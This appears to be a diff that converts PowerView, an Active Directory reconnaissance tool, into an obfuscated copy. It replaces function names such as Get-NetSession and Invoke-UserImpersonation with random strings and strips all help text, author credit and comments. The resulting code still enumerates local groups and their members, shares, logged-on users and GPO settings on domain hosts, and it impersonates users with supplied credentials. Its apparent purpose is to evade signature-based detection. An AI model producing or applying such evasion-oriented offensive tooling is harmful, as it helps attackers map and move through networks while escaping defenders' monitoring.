                 $OUIndex = $DN.IndexOf('OU=')
                 if ($OUIndex -gt 0) {
                     $OUName = $DN.SubString($OUIndex)
                 }
                 if ($OUName) {
-                    $GPOGuids += Get-DomainOU @CommonArguments -SearchBase $OUName -LDAPFilter '(gplink=*)' | ForEach-Object {
+                    $GPOGuids += HM6W17ZN @CommonArguments -SearchBase $OUName -LDAPFilter '(gplink=*)' | ForEach-Object {
                         Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                     }
                 }
 
-                # extract any GPOs linked to this computer's site through gpLink
+                
                 Write-Verbose "Enumerating the sitename for: $($Computer.dnshostname)"
-                $ComputerSite = (Get-NetComputerSiteName -ComputerName $Computer.dnshostname).SiteName
+                $ComputerSite = (QNE3IO5Q -ComputerName $Computer.dnshostname).SiteName
                 if ($ComputerSite -and ($ComputerSite -notmatch 'Error')) {
-                    $GPOGuids += Get-DomainSite @CommonArguments -Identity $ComputerSite -LDAPFilter '(gplink=*)' | ForEach-Object {
+                    $GPOGuids += XMOLM1NY @CommonArguments -Identity $ComputerSite -LDAPFilter '(gplink=*)' | ForEach-Object {
                         Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                     }
                 }
 
-                # process any GPO local group settings from the GPO GUID set
-                $GPOGuids | Get-DomainGPOLocalGroup @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
+                
+                $GPOGuids | 5I3AJMSKLocalGroup @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                     $GPOGroup = $_
 
                     if($GPOGroup.GroupMembers) {
@@ -13982,7 +8478,7 @@ PowerView.GGPOComputerLocalGroupMember
                     }
 
                     $GPOMembers | ForEach-Object {
-                        $Object = Get-DomainObject @CommonArguments -Identity $_
+                        $Object = U3GGBSG9 @CommonArguments -Identity $_
                         $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
 
                         $GPOComputerLocalGroupMember = New-Object PSObject
@@ -14005,80 +8501,8 @@ PowerView.GGPOComputerLocalGroupMember
 }
 
 
-function Get-DomainPolicyData {
-<#
-.SYNOPSIS
+function Q2KSRNB4 {
 
-Returns the default domain policy or the domain controller policy for the current
-domain or a specified domain/domain controller.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainGPO, Get-GptTmpl, ConvertFrom-SID  
-
-.DESCRIPTION
-
-Returns the default domain policy or the domain controller policy for the current
-domain or a specified domain/domain controller using Get-DomainGPO.
-
-.PARAMETER Domain
-
-The domain to query for default policies, defaults to the current domain.
-
-.PARAMETER Policy
-
-Extract 'Domain', 'DC' (domain controller) policies, or 'All' for all policies.
-Otherwise queries for the particular GPO name or GUID.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainPolicyData
-
-Returns the default domain policy for the current domain.
-
-.EXAMPLE
-
-Get-DomainPolicyData -Domain dev.testlab.local
-
-Returns the default domain policy for the dev.testlab.local domain.
-
-.EXAMPLE
-
-Get-DomainGPO | Get-DomainPolicy
-
-Parses any GptTmpl.infs found for any policies in the current domain.
-
-.EXAMPLE
-
-Get-DomainPolicyData -Policy DC -Domain dev.testlab.local
-
-Returns the policy for the dev.testlab.local domain controller.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainPolicyData -Credential $Cred
-
-.OUTPUTS
-
-Hashtable
-
-Ouputs a hashtable representing the parsed GptTmpl.inf file.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([Hashtable])]
@@ -14137,10 +8561,10 @@ Ouputs a hashtable representing the parsed GptTmpl.inf file.
             $SearcherArguments['Identity'] = $Policy
         }
 
-        $GPOResults = Get-DomainGPO @SearcherArguments
+        $GPOResults = 5I3AJMSK @SearcherArguments
 
         ForEach ($GPO in $GPOResults) {
-            # grab the GptTmpl.inf file and parse it
+            
             $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
 
             $ParseArgs =  @{
@@ -14149,8 +8573,8 @@ Ouputs a hashtable representing the parsed GptTmpl.inf file.
             }
             if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }
 
-            # parse the GptTmpl.inf
-            Get-GptTmpl @ParseArgs | ForEach-Object {
+            
+            W8HZ4RVI @ParseArgs | ForEach-Object {
                 $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                 $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                 $_
@@ -14160,94 +8584,16 @@ Ouputs a hashtable representing the parsed GptTmpl.inf file.
 }
 
 
-########################################################
-#
-# Functions that enumerate a single host, either through
-# WinNT, WMI, remote registry, or API calls
-# (with PSReflect).
-#
-########################################################
 
-function Get-NetLocalGroup {
-<#
-.SYNOPSIS
 
-Enumerates the local groups on the local (or remote) machine.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect  
 
-.DESCRIPTION
 
-This function will enumerate the names and descriptions for the
-local groups on the current, or remote, machine. By default, the Win32 API
-call NetLocalGroupEnum will be used (for speed). Specifying "-Method WinNT"
-causes the WinNT service provider to be used instead, which returns group
-SIDs along with the group names and descriptions/comments.
 
-.PARAMETER ComputerName
 
-Specifies the hostname to query for sessions (also accepts IP addresses).
-Defaults to the localhost.
 
-.PARAMETER Method
+function X6KG5CL9 {
 
-The collection method to use, defaults to 'API', also accepts 'WinNT'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to a remote machine. Only applicable with "-Method WinNT".
-
-.EXAMPLE
-
-Get-NetLocalGroup
-
-ComputerName                  GroupName                     Comment
-------------                  ---------                     -------
-WINDOWS1                      Administrators                Administrators have comple...
-WINDOWS1                      Backup Operators              Backup Operators can overr...
-WINDOWS1                      Cryptographic Operators       Members are authorized to ...
-...
-
-.EXAMPLE
-
-Get-NetLocalGroup -Method Winnt
-
-ComputerName           GroupName              GroupSID              Comment
-------------           ---------              --------              -------
-WINDOWS1               Administrators         S-1-5-32-544          Administrators hav...
-WINDOWS1               Backup Operators       S-1-5-32-551          Backup Operators c...
-WINDOWS1               Cryptographic Opera... S-1-5-32-569          Members are author...
-...
-
-.EXAMPLE
-
-Get-NetLocalGroup -ComputerName primary.testlab.local
-
-ComputerName                  GroupName                     Comment
-------------                  ---------                     -------
-primary.testlab.local         Administrators                Administrators have comple...
-primary.testlab.local         Users                         Users are prevented from m...
-primary.testlab.local         Guests                        Guests have the same acces...
-primary.testlab.local         Print Operators               Members can administer dom...
-primary.testlab.local         Backup Operators              Backup Operators can overr...
-
-.OUTPUTS
-
-PowerView.LocalGroup.API
-
-Custom PSObject with translated group property fields from API results.
-
-PowerView.LocalGroup.WinNT
-
-Custom PSObject with translated group property fields from WinNT results.
-
-.LINK
-
-https://msdn.microsoft.com/en-us/library/windows/desktop/aa370440(v=vs.85).aspx
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.LocalGroup.API')]
@@ -14272,37 +8618,37 @@ https://msdn.microsoft.com/en-us/library/windows/desktop/aa370440(v=vs.85).aspx
 
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $LogonToken = Invoke-UserImpersonation -Credential $Credential
+            $LogonToken = ECK2AE5S -Credential $Credential
         }
     }
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
             if ($Method -eq 'API') {
-                # if we're using the Netapi32 NetLocalGroupEnum API call to get the local group information
+                
 
-                # arguments for NetLocalGroupEnum
+                
                 $QueryLevel = 1
                 $PtrInfo = [IntPtr]::Zero
                 $EntriesRead = 0
                 $TotalRead = 0
                 $ResumeHandle = 0
 
-                # get the local user information
+                
                 $Result = $Netapi32::NetLocalGroupEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
 
-                # locate the offset of the initial intPtr
+                
                 $Offset = $PtrInfo.ToInt64()
 
-                # 0 = success
+                
                 if (($Result -eq 0) -and ($Offset -gt 0)) {
 
-                    # Work out how much to increment the pointer by finding out the size of the structure
+                    
                     $Increment = $LOCALGROUP_INFO_1::GetSize()
 
-                    # parse all the result structures
+                    
                     for ($i = 0; ($i -lt $EntriesRead); $i++) {
-                        # create a new int ptr at the given offset and cast the pointer as our result structure
+                        
                         $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                         $Info = $NewIntPtr -as $LOCALGROUP_INFO_1
 
@@ -14316,15 +8662,15 @@ https://msdn.microsoft.com/en-us/library/windows/desktop/aa370440(v=vs.85).aspx
                         $LocalGroup.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                         $LocalGroup
                     }
-                    # free up the result buffer
+                    
                     $Null = $Netapi32::NetApiBufferFree($PtrInfo)
                 }
                 else {
-                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
+                    Write-Verbose "[X6KG5CL9] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                 }
             }
             else {
-                # otherwise we're using the WinNT service provider
+                
                 $ComputerProvider = [ADSI]"WinNT://$Computer,computer"
 
                 $ComputerProvider.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
@@ -14343,113 +8689,14 @@ https://msdn.microsoft.com/en-us/library/windows/desktop/aa370440(v=vs.85).aspx
     
     END {
         if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
+            JCUMHZOK -TokenHandle $LogonToken
         }
     }
 }
 
 
-function Get-NetLocalGroupMember {
-<#
-.SYNOPSIS
+function X6KG5CL9Member {
 
-Enumerates members of a specific local group on the local (or remote) machine.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect, Convert-ADName  
-
-.DESCRIPTION
-
-This function will enumerate the members of a specified local group  on the
-current, or remote, machine. By default, the Win32 API call NetLocalGroupGetMembers
-will be used (for speed). Specifying "-Method WinNT" causes the WinNT service provider
-to be used instead, which returns a larger amount of information.
-
-.PARAMETER ComputerName
-
-Specifies the hostname to query for sessions (also accepts IP addresses).
-Defaults to the localhost.
-
-.PARAMETER GroupName
-
-The local group name to query for users. If not given, it defaults to "Administrators".
-
-.PARAMETER Method
-
-The collection method to use, defaults to 'API', also accepts 'WinNT'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to a remote machine. Only applicable with "-Method WinNT".
-
-.EXAMPLE
-
-Get-NetLocalGroupMember | ft
-
-ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
-------------   ---------      ----------     ---                   -------       --------
-WINDOWS1       Administrators WINDOWS1\Ad... S-1-5-21-25...          False          False
-WINDOWS1       Administrators WINDOWS1\lo... S-1-5-21-25...          False          False
-WINDOWS1       Administrators TESTLAB\Dom... S-1-5-21-89...           True           True
-WINDOWS1       Administrators TESTLAB\har... S-1-5-21-89...          False           True
-
-.EXAMPLE
-
-Get-NetLocalGroupMember -Method winnt | ft
-
-ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
-------------   ---------      ----------     ---                   -------       --------
-WINDOWS1       Administrators WINDOWS1\Ad... S-1-5-21-25...          False          False
-WINDOWS1       Administrators WINDOWS1\lo... S-1-5-21-25...          False          False
-WINDOWS1       Administrators TESTLAB\Dom... S-1-5-21-89...           True           True
-WINDOWS1       Administrators TESTLAB\har... S-1-5-21-89...          False           True
-
-.EXAMPLE
-
-Get-NetLocalGroup | Get-NetLocalGroupMember | ft
-
-ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
-------------   ---------      ----------     ---                   -------       --------
-WINDOWS1       Administrators WINDOWS1\Ad... S-1-5-21-25...          False          False
-WINDOWS1       Administrators WINDOWS1\lo... S-1-5-21-25...          False          False
-WINDOWS1       Administrators TESTLAB\Dom... S-1-5-21-89...           True           True
-WINDOWS1       Administrators TESTLAB\har... S-1-5-21-89...          False           True
-WINDOWS1       Guests         WINDOWS1\Guest S-1-5-21-25...          False          False
-WINDOWS1       IIS_IUSRS      NT AUTHORIT... S-1-5-17                False          False
-WINDOWS1       Users          NT AUTHORIT... S-1-5-4                 False          False
-WINDOWS1       Users          NT AUTHORIT... S-1-5-11                False          False
-WINDOWS1       Users          WINDOWS1\lo... S-1-5-21-25...          False        UNKNOWN
-WINDOWS1       Users          TESTLAB\Dom... S-1-5-21-89...           True        UNKNOWN
-
-.EXAMPLE
-
-Get-NetLocalGroupMember -ComputerName primary.testlab.local | ft
-
-ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
-------------   ---------      ----------     ---                   -------       --------
-primary.tes... Administrators TESTLAB\Adm... S-1-5-21-89...          False          False
-primary.tes... Administrators TESTLAB\loc... S-1-5-21-89...          False          False
-primary.tes... Administrators TESTLAB\Ent... S-1-5-21-89...           True          False
-primary.tes... Administrators TESTLAB\Dom... S-1-5-21-89...           True          False
-
-.OUTPUTS
-
-PowerView.LocalGroupMember.API
-
-Custom PSObject with translated group property fields from API results.
-
-PowerView.LocalGroupMember.WinNT
-
-Custom PSObject with translated group property fields from WinNT results.
-
-.LINK
-
-http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
-http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx
-https://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.LocalGroupMember.API')]
@@ -14478,39 +8725,39 @@ https://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx
 
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $LogonToken = Invoke-UserImpersonation -Credential $Credential
+            $LogonToken = ECK2AE5S -Credential $Credential
         }
     }
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
             if ($Method -eq 'API') {
-                # if we're using the Netapi32 NetLocalGroupGetMembers API call to get the local group information
+                
 
-                # arguments for NetLocalGroupGetMembers
+                
                 $QueryLevel = 2
                 $PtrInfo = [IntPtr]::Zero
                 $EntriesRead = 0
                 $TotalRead = 0
                 $ResumeHandle = 0
 
-                # get the local user information
+                
                 $Result = $Netapi32::NetLocalGroupGetMembers($Computer, $GroupName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
 
-                # locate the offset of the initial intPtr
+                
                 $Offset = $PtrInfo.ToInt64()
 
                 $Members = @()
 
-                # 0 = success
+                
                 if (($Result -eq 0) -and ($Offset -gt 0)) {
 
-                    # Work out how much to increment the pointer by finding out the size of the structure
+                    
                     $Increment = $LOCALGROUP_MEMBERS_INFO_2::GetSize()
 
-                    # parse all the result structures
+                    
                     for ($i = 0; ($i -lt $EntriesRead); $i++) {
-                        # create a new int ptr at the given offset and cast the pointer as our result structure
+                        
                         $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                         $Info = $NewIntPtr -as $LOCALGROUP_MEMBERS_INFO_2
 
@@ -14521,7 +8768,7 @@ https://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx
                         $Result2 = $Advapi32::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
                         if ($Result2 -eq 0) {
-                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+                            Write-Verbose "[X6KG5CL9Member] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                         }
                         else {
                             $Member = New-Object PSObject
@@ -14536,10 +8783,10 @@ https://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx
                         }
                     }
 
-                    # free up the result buffer
+                    
                     $Null = $Netapi32::NetApiBufferFree($PtrInfo)
 
-                    # try to extract out the machine SID by using the -500 account as a reference
+                    
                     $MachineSid = $Members | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                     if ($MachineSid) {
                         $MachineSid = $MachineSid.Substring(0, $MachineSid.LastIndexOf('-'))
@@ -14566,11 +8813,11 @@ https://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx
                     $Members
                 }
                 else {
-                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
+                    Write-Verbose "[X6KG5CL9Member] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                 }
             }
             else {
-                # otherwise we're using the WinNT service provider
+                
                 try {
                     $GroupProvider = [ADSI]"WinNT://$Computer/$GroupName,group"
 
@@ -14585,12 +8832,12 @@ https://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx
                         $IsGroup = ($LocalUser.SchemaClassName -like 'group')
 
                         if(([regex]::Matches($AdsPath, '/')).count -eq 1) {
-                            # DOMAIN\user
+                            
                             $MemberIsDomain = $True
                             $Name = $AdsPath.Replace('/', '\')
                         }
                         else {
-                            # DOMAIN\machine\user
+                            
                             $MemberIsDomain = $False
                             $Name = $AdsPath.Substring($AdsPath.IndexOf('/')+1).Replace('/', '\')
                         }
@@ -14600,59 +8847,59 @@ https://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx
                         $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
                         $Member | Add-Member Noteproperty 'IsDomain' $MemberIsDomain
 
-                        # if ($MemberIsDomain) {
-                        #     # translate the binary sid to a string
-                        #     $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
-                        #     $Member | Add-Member Noteproperty 'Description' ''
-                        #     $Member | Add-Member Noteproperty 'Disabled' ''
+                        
+                        
+                        
+                        
+                        
 
-                        #     if ($IsGroup) {
-                        #         $Member | Add-Member Noteproperty 'LastLogin' ''
-                        #     }
-                        #     else {
-                        #         try {
-                        #             $Member | Add-Member Noteproperty 'LastLogin' $LocalUser.InvokeGet('LastLogin')
-                        #         }
-                        #         catch {
-                        #             $Member | Add-Member Noteproperty 'LastLogin' ''
-                        #         }
-                        #     }
-                        #     $Member | Add-Member Noteproperty 'PwdLastSet' ''
-                        #     $Member | Add-Member Noteproperty 'PwdExpired' ''
-                        #     $Member | Add-Member Noteproperty 'UserFlags' ''
-                        # }
-                        # else {
-                        #     # translate the binary sid to a string
-                        #     $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
-                        #     $Member | Add-Member Noteproperty 'Description' ($LocalUser.Description)
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
 
-                        #     if ($IsGroup) {
-                        #         $Member | Add-Member Noteproperty 'PwdLastSet' ''
-                        #         $Member | Add-Member Noteproperty 'PwdExpired' ''
-                        #         $Member | Add-Member Noteproperty 'UserFlags' ''
-                        #         $Member | Add-Member Noteproperty 'Disabled' ''
-                        #         $Member | Add-Member Noteproperty 'LastLogin' ''
-                        #     }
-                        #     else {
-                        #         $Member | Add-Member Noteproperty 'PwdLastSet' ( (Get-Date).AddSeconds(-$LocalUser.PasswordAge[0]))
-                        #         $Member | Add-Member Noteproperty 'PwdExpired' ( $LocalUser.PasswordExpired[0] -eq '1')
-                        #         $Member | Add-Member Noteproperty 'UserFlags' ( $LocalUser.UserFlags[0] )
-                        #         # UAC flags of 0x2 mean the account is disabled
-                        #         $Member | Add-Member Noteproperty 'Disabled' $(($LocalUser.UserFlags.value -band 2) -eq 2)
-                        #         try {
-                        #             $Member | Add-Member Noteproperty 'LastLogin' ( $LocalUser.LastLogin[0])
-                        #         }
-                        #         catch {
-                        #             $Member | Add-Member Noteproperty 'LastLogin' ''
-                        #         }
-                        #     }
-                        # }
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
 
                         $Member
                     }
                 }
                 catch {
-                    Write-Verbose "[Get-NetLocalGroupMember] Error for $Computer : $_"
+                    Write-Verbose "[X6KG5CL9Member] Error for $Computer : $_"
                 }
             }
         }
@@ -14660,72 +8907,14 @@ https://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx
     
     END {
         if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
+            JCUMHZOK -TokenHandle $LogonToken
         }
     }
 }
 
 
-function Get-NetShare {
-<#
-.SYNOPSIS
+function BFEUNBGI {
 
-Returns open shares on the local (or a remote) machine.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  
-
-.DESCRIPTION
-
-This function will execute the NetShareEnum Win32API call to query
-a given host for open shares. This is a replacement for "net share \\hostname".
-
-.PARAMETER ComputerName
-
-Specifies the hostname to query for shares (also accepts IP addresses).
-Defaults to 'localhost'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the remote system using Invoke-UserImpersonation.
-
-.EXAMPLE
-
-Get-NetShare
-
-Returns active shares on the local host.
-
-.EXAMPLE
-
-Get-NetShare -ComputerName sqlserver
-
-Returns active shares on the 'sqlserver' host
-
-.EXAMPLE
-
-Get-DomainComputer | Get-NetShare
-
-Returns all shares for all computers in the domain.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-NetShare -ComputerName sqlserver -Credential $Cred
-
-.OUTPUTS
-
-PowerView.ShareInfo
-
-A PSCustomObject representing a SHARE_INFO_1 structure, including
-the name/type/remark for each share, with the ComputerName added.
-
-.LINK
-
-http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
-#>
 
     [OutputType('PowerView.ShareInfo')]
     [CmdletBinding()]
@@ -14743,38 +8932,38 @@ http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-w
 
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $LogonToken = Invoke-UserImpersonation -Credential $Credential
+            $LogonToken = ECK2AE5S -Credential $Credential
         }
     }
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
-            # arguments for NetShareEnum
+            
             $QueryLevel = 1
             $PtrInfo = [IntPtr]::Zero
             $EntriesRead = 0
             $TotalRead = 0
             $ResumeHandle = 0
 
-            # get the raw share information
+            
             $Result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
 
-            # locate the offset of the initial intPtr
+            
             $Offset = $PtrInfo.ToInt64()
 
-            # 0 = success
+            
             if (($Result -eq 0) -and ($Offset -gt 0)) {
 
-                # work out how much to increment the pointer by finding out the size of the structure
+                
                 $Increment = $SHARE_INFO_1::GetSize()
 
-                # parse all the result structures
+                
                 for ($i = 0; ($i -lt $EntriesRead); $i++) {
-                    # create a new int ptr at the given offset and cast the pointer as our result structure
+                    
                     $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                     $Info = $NewIntPtr -as $SHARE_INFO_1
 
-                    # return all the sections of the structure - have to do it this way for V2
+                    
                     $Share = $Info | Select-Object *
                     $Share | Add-Member Noteproperty 'ComputerName' $Computer
                     $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
@@ -14783,84 +8972,25 @@ http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-w
                     $Share
                 }
 
-                # free up the result buffer
+                
                 $Null = $Netapi32::NetApiBufferFree($PtrInfo)
             }
             else {
-                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
+                Write-Verbose "[BFEUNBGI] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
             }
         }
     }
 
     END {
         if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
+            JCUMHZOK -TokenHandle $LogonToken
         }
     }
 }
 
 
-function Get-NetLoggedon {
-<#
-.SYNOPSIS
+function 4SWKN0XB {
 
-Returns users logged on the local (or a remote) machine.
-Note: administrative rights needed for newer Windows OSes.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  
-
-.DESCRIPTION
-
-This function will execute the NetWkstaUserEnum Win32API call to query
-a given host for actively logged on users.
-
-.PARAMETER ComputerName
-
-Specifies the hostname to query for logged on users (also accepts IP addresses).
-Defaults to 'localhost'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the remote system using Invoke-UserImpersonation.
-
-.EXAMPLE
-
-Get-NetLoggedon
-
-Returns users actively logged onto the local host.
-
-.EXAMPLE
-
-Get-NetLoggedon -ComputerName sqlserver
-
-Returns users actively logged onto the 'sqlserver' host.
-
-.EXAMPLE
-
-Get-DomainComputer | Get-NetLoggedon
-
-Returns all logged on users for all computers in the domain.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-NetLoggedon -ComputerName sqlserver -Credential $Cred
-
-.OUTPUTS
-
-PowerView.LoggedOnUserInfo
-
-A PSCustomObject representing a WKSTA_USER_INFO_1 structure, including
-the UserName/LogonDomain/AuthDomains/LogonServer for each user, with the ComputerName added.
-
-.LINK
-
-http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
-#>
 
     [OutputType('PowerView.LoggedOnUserInfo')]
     [CmdletBinding()]
@@ -14878,38 +9008,38 @@ http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-w
 
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $LogonToken = Invoke-UserImpersonation -Credential $Credential
+            $LogonToken = ECK2AE5S -Credential $Credential
         }
     }
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
-            # declare the reference variables
+            
             $QueryLevel = 1
             $PtrInfo = [IntPtr]::Zero
             $EntriesRead = 0
             $TotalRead = 0
             $ResumeHandle = 0
 
-            # get logged on user information
+            
             $Result = $Netapi32::NetWkstaUserEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
 
-            # locate the offset of the initial intPtr
+            
             $Offset = $PtrInfo.ToInt64()
 
-            # 0 = success
+            
             if (($Result -eq 0) -and ($Offset -gt 0)) {
 
-                # work out how much to increment the pointer by finding out the size of the structure
+                
                 $Increment = $WKSTA_USER_INFO_1::GetSize()
 
-                # parse all the result structures
+                
                 for ($i = 0; ($i -lt $EntriesRead); $i++) {
-                    # create a new int ptr at the given offset and cast the pointer as our result structure
+                    
                     $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                     $Info = $NewIntPtr -as $WKSTA_USER_INFO_1
 
-                    # return all the sections of the structure - have to do it this way for V2
+                    
                     $LoggedOn = $Info | Select-Object *
                     $LoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
                     $LoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
@@ -14918,83 +9048,25 @@ http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-w
                     $LoggedOn
                 }
 
-                # free up the result buffer
+                
                 $Null = $Netapi32::NetApiBufferFree($PtrInfo)
             }
             else {
-                Write-Verbose "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
+                Write-Verbose "[4SWKN0XB] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
             }
         }
     }
 
     END {
         if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
+            JCUMHZOK -TokenHandle $LogonToken
         }
     }
 }
 
 
-function Get-NetSession {
-<#
-.SYNOPSIS
+function 3F2205T7 {
 
-Returns session information for the local (or a remote) machine.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  
-
-.DESCRIPTION
-
-This function will execute the NetSessionEnum Win32API call to query
-a given host for active sessions.
-
-.PARAMETER ComputerName
-
-Specifies the hostname to query for sessions (also accepts IP addresses).
-Defaults to 'localhost'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the remote system using Invoke-UserImpersonation.
-
-.EXAMPLE
-
-Get-NetSession
-
-Returns active sessions on the local host.
-
-.EXAMPLE
-
